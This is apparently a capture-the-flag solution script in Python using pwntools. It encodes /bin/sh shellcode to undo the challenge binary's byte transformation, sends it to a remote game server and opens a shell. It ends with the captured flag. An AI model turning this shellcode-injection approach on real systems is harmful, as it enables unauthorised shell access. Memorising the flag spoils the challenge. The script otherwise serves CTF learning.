from pwn import *

context.binary = elf = ELF("shellcoded")

r = remote("challenge.ctf.games", 32175)

# shellcode from pwn library
shellcode = list(asm(shellcraft.sh()))

# manually find shellcode online
#shellcode = list(b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')

modified_sc = []

# reverse the action done by the binary
for i in range(len(shellcode)):
    if i & 1 != 0:
        v3 = 1
    else:
        v3 = -1
        
    # 1. '& 0xFF': brings negative int back to unsigned byte convertible range
    # 2. byte-order: little since arch is amd-64-little
    # 3. byte code shld be unsigned, since adding or subtracting from the original compiled shell code
    # will result in unsigned overflow if not within range 0 to 0xff, which brings it back to the original bytecode in the shellcode
    modified_sc.append(((shellcode[i] + (v3 * i))&0xFF).to_bytes(1, byteorder = 'little', signed = False))
    
str_sc = b''.join(modified_sc)

# payload
print(str_sc)

r.sendline(str_sc)

r.interactive()
    
# flag{f27646ae277113d24c73dbc66a816721}
